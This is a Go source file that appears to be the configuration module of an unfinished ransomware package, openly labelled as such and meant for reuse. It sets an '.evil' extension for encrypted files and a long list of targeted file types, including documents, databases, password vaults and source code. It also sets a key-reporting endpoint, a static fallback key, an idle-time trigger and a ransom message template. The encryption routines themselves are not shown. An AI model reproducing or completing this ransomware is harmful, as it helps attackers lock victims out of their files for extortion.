package ransomware

///TODO: implement this
///Use comments to store the variable's data type and use an appropriate input/picker to take the input from the user
///these are all marked as vars so people could change it when using this as a package

// extension string Encrypted files extension
var extension = ".evil"

///TODO: use this
// MaxFileSize uint If the file size is bigger than this, don't encrypt the file
var MaxFileSize = 1024 * 1024 * 1024 * 1024

// UseDict bool The dict is faster if you have ~70 or more extensions, if this is set to true a dictionary will be used instead of a list
var UseDict = true

// SendKeyAtStart bool Sends the key at the start of the encryption
var SendKeyAtStart = true

// WallpaperUrl string Sets the wallpaper, leave empty to disable
var WallpaperUrl = ""

// WaitForInternet bool if this is false it will use the static key and won't wait for the user to be online
var WaitForInternet = true

// StaticKey string the static key which will be used to encrypt the files if there is no internet and the apropriate setting is enabled
var StaticKey = "12345678901234567890123456789012" ///insecure af

// WaitAfk uint Time to wait until the user is considered afk and the ransomware is ran, in nanoseconds (divide by 1000000000)
var WaitAfk = 1000000000 ///for debugging purposes

// extensionsSlice stringSlice Files which have any of these extensions will get encrypted by the ransomware
var extensionsSlice = []string{
	".go", ".bk", ".txt", ".hc", ".mp4", ".7z", ".flp", ".mkv", ".flac", ".flv", ".dat", ".kdbx", ".aep", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".odp", ".ods", ".odt", ".ppt", ".pptx", ".raw", ".jpg", ".jpeg", ".png", ".csv", ".py", ".sql", ".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".c", ".cs", ".f3d", ".dwg", ".cpp", ".zip", ".rar", ".mov", ".rtf", ".bmp", ".mkv", ".avi", ".iso", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".uue", ".xz", ".z", ".001", ".mpeg", ".mp3", ".mpg", ".db",
}

// extensionDict mapStringByte Files which have any of these extensions will get encrypted by the ransomware
var extensionDict = map[string]byte{
	".go": 1, ".bk": 1, ".txt": 1, ".hc": 1, ".7z": 1, ".flp": 1, ".flac": 1, ".flv": 1, ".dat": 1, ".kdbx": 1, ".aep": 1, ".contact": 1, ".settings": 1, ".doc": 1, ".docx": 1, ".xls": 1, ".xlsx": 1, ".odp": 1, ".ods": 1, ".odt": 1, ".ppt": 1, ".pptx": 1, ".raw": 1, ".jpg": 1, ".jpeg": 1, ".png": 1, ".csv": 1, ".py": 1, ".sql": 1, ".mdb": 1, ".php": 1, ".asp": 1, ".aspx": 1, ".html": 1, ".htm": 1, ".xml": 1, ".psd": 1, ".pdf": 1, ".c": 1, ".cs": 1, ".mp3": 1, ".mp4": 1, ".f3d": 1, ".dwg": 1, ".cpp": 1, ".zip": 1, ".rar": 1, ".mov": 1, ".rtf": 1, ".bmp": 1, ".mkv": 1, ".avi": 1, ".iso": 1, ".bz2": 1, ".cab": 1, ".gzip": 1, ".lzh": 1, ".tar": 1, ".uue": 1, ".xz": 1, ".z": 1, ".001": 1, ".mpeg": 1, ".mpg": 1, ".db": 1,
}

// Debug bool DebugMode
var Debug = true

// endpoint string The endpoint where the ransomware will post the data
var endpoint = "127.0.0.1:6031/ransomware"

// charset string The characters used for the ransomware's password
var charset = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789!@#$%^&*()_-+={}[]:\";'\\<>,.?/`~"

///TODO: make this work somehow
// Key any If you want to use a satic key, put it here
var Key = GenerateKey()

/// TODO: code a custom uuid thingy or use a package
var UUID = ""

/// TODO: check if go has string interpolation
/// Change this message based on what you want the user to see
var Message = "Your unique id is " + UUID + " other text you might want here"
